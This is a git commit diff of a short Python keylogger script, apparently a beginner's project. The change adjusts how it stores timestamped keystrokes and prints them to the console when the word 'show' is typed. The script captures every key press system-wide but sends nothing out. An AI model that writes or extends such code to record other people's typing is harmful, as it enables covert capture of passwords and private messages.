bd026818b67f43134c8f66a06f54a2a072fc1fb8
Yosef shoval <ys0542522504@gmail.com>
2025-06-18 22:02:56 +0300

    for show

--- prodect keylogger.py
+++ prodect keylogger.py
@@ -1,4 +1,3 @@
-
 import keyboard
 from datetime import datetime
 
@@ -7,7 +6,7 @@ dicti = {}
 dicti_for_show = {"all times":''}
 
 def on_key_press(key):
-    global dicti_for_show
+    global dicti,dicti_for_show
     key = str(key)[14:-6]
     currentTime = datetime.now().strftime('%d/%m/%y %H:%M')
 
@@ -16,19 +15,17 @@ def on_key_press(key):
 
     dicti[currentTime] += key
     dicti_for_show["all times"] += key
-    print(key)
 
     if "show" in dicti_for_show["all times"]:
-        for k,v in dicti_for_show.items():
+        for k,v in dicti.items():
+            print()
             print(k)
             print(v)
-        dicti_for_show = {}
+            print()
+        dicti = {}
+        dicti_for_show = {"all times":''}
+
 
 
 keyboard.on_press(on_key_press)
 keyboard.wait('Ctrl + Shift + .')
-
-for k, v in dicti.items():
-    print(k)
-    print(v)
-    print()
